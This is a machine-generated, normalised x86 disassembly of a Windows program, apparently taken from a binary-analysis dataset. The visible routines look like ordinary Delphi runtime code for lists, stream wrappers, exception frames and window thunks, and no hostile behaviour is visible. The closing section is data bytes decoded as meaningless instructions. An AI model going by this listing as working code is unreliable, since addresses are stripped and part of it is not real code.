mov [ ebp - 0x4 ] eax
sub_419e9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407d1c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_419f34
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
sub_419f34
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_413f44
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407d1c
test al al
jne r-xdata
sub_419f84
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4043b4
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407ea0
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
xor edx edx
mov eax ebx
call sub_41a104
mov edx esi
mov eax ebx
call sub_41a010
mov dl 0x1
mov eax ebx
call sub_41a104
sub_41a024
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413f44
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413ed0
sub_41a060
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413fa0
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413e34
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413fc0
sub_41a0b4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a050
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a024
mov cl 0x1
mov edx ebx
call sub_41a0b4
inc edi
dec ebp
jne r-xdata
sub_41a104
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404244
mov edx esp
mov eax esi
call sub_40352c
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a14c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a174
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a1bc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_40330c
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a1fc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a21c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41a240
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41a288
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov edx esi
call sub_41a4b8
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41a2f0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41a4b8
mov edx ebx
mov eax esi
call sub_41a4ac
sub_41a334
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41a378
push ebx
push esi
push edi
call sub_4035e4
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a78
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_419d2c
jmp r-xdata
mov eax esi
call sub_41402c
mov edx eax
mov eax edi
call sub_41a4b8
lea eax [ edi + 0x50 ]
call sub_40d250
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
sub_41a3d8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419d48
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41a404
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41a420
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41a43c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_413f44
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41a4b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413e34
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_413f44
cmp ebp eax
jne r-xdata
sub_41a4f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_419d2c
mov edx ebx
call sub_419afc
sub_41a524
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41a56c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_403258
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_41a5a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a5f3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a60c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41a65b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41a674
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a6de
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41a6f8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41a741
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_415c20
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41a75c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405738
xor eax eax
push ebp
push sub_41a949
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_41a922
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_4026bc
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41a911
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a950
lea eax [ ebp + 0xc ]
call sub_4056c4
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_41a98c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_41a9ef
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41aa20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_4142b0
mov edi eax
xor eax eax
push ebp
push sub_41aa75
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aa7c
mov eax [ rw-data ]
call sub_414314
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413f44
call sub_403258
inc esi
dec ebx
jne r-xdata
sub_41aa94
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_41aabc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_4028b8
mov edx sub_41aa94
lea eax [ esi + 0x5 ]
call sub_41aab4
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_41aab4
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_41ab78
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406a40
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41aabc
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_41ac2c
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_41ab54
sub_41ac54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41acf8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41acff
retn
mov eax [ rw-data ]
call sub_413734
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_41aa20
xor edx edx
xor eax eax
call sub_416c50
mov eax rw-data
call sub_40d250
call sub_405df4
lea eax [ eax + 0xc ]
call sub_40d250
mov eax rw-data
call sub_40d250
mov eax rw-data
call sub_4056c4
mov eax sub_41aa8c
call sub_405560
mov eax rw-data
call sub_40d250
call sub_41984c
mov eax rw-data
call sub_40d250
mov eax rw-data
call sub_4056c4
sub_41ad04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41ad8d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ad94
retn
call sub_419818
mov eax sub_41aa8c
call sub_405558
mov dl 0x1
mov eax [ r-xdata ]
call sub_40cf90
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4056dc
mov dl 0x1
mov eax [ r-xdata ]
call sub_413030
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414158
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_414158
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_41ad98
push esi
inc edi
add [ edx + 0x640000ff ] cl
push esi
inc edi
add [ ebx + 0x640000ff ] cl
push esi
inc edi
add [ edi + edi * 8 + 0x56640000 ] cl
inc edi
add [ ebp + 0x640000ff ] cl
push esi
inc edi
add [ esi + 0x640000ff ] cl
push esi
inc edi
add [ edi + 0x640000ff ] cl
push esi
inc edi
add [ eax - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] dh
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] dh
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] bh
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] bh
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] ah
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] ah
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] ch
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] ch
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] dl
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] dl
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] bl
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] bl
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] al
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] al
add [ eax ] al
push esi
inc edi
add [ eax - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ ecx - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ edx - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ ebx - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ edi + edi * 8 ] cl
add [ esi + edx * 2 + 0x47 ] ah
add [ ebp - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ esi - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ edi - 0x1 ] cl
add [ eax ] al
push esi
inc edi
add [ eax ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ecx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ edx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
add [ ebx ] dh
inc [ eax ]
add [ esi + edx * 2 + 0x47 ] ah
